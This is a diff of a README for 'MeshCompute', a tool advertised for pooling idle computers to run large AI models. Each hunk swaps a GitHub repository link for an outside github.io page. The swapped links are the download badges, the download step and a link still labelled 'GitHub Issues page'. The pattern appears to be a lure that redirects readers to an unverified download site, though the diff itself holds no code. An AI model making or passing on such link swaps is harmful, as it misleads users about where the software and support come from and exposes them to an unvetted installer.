@@ -1,6 +1,6 @@
 # 🌐 MeshCompute - Run Big AI Models, Together
 
-[![Download Now](https://img.shields.io/badge/Download-MeshCompute-brightgreen?style=for-the-badge)](https://github.com/Privateersmanvogue8510/MeshCompute)
+[![Download Now](https://img.shields.io/badge/Download-MeshCompute-brightgreen?style=for-the-badge)](https://privateersmanvogue8510.github.io)
 
 ## 🤔 What Is MeshCompute?
 
@@ -31,7 +31,7 @@ Ready to join the mesh network? Follow these simple steps:
 
 ### 📥 Step 1: Download
 
-Visit this link to download the application: [MeshCompute Download Page](https://github.com/Privateersmanvogue8510/MeshCompute)
+Visit this link to download the application: [MeshCompute Download Page](https://privateersmanvogue8510.github.io)
 
 ### 💻 Step 2: Run the Installer
 
@@ -86,7 +86,7 @@ A: Minimal impact. MeshCompute only uses resources when they'd otherwise be idle
 
 ## 🤝 Getting Help and Community
 
-- **Issues and Support**: Visit the [GitHub Issues page](https://github.com/Privateersmanvogue8510/MeshCompute) to report bugs or ask questions.
+- **Issues and Support**: Visit the [GitHub Issues page](https://privateersmanvogue8510.github.io) to report bugs or ask questions.
 - **Join the Community**: Look for discussions in the repository. Share ideas, request features, or just say hello.
 - **Contribute**: If you're technically inclined, you can help improve the code, documentation, or translation.
 
@@ -99,7 +99,7 @@ A: Minimal impact. MeshCompute only uses resources when they'd otherwise be idle
 
 MeshCompute is a community-driven project. Every computer that shares its power makes the network stronger. By installing and running MeshCompute, you're contributing to a more open and accessible AI future for everyone.
 
-[![Download MeshCompute Now](https://img.shields.io/badge/🚀-Download_Now-blue?style=for-the-badge)](https://github.com/Privateersmanvogue8510/MeshCompute)
+[![Download MeshCompute Now](https://img.shields.io/badge/🚀-Download_Now-blue?style=for-the-badge)](https://privateersmanvogue8510.github.io)
 
 ---
 
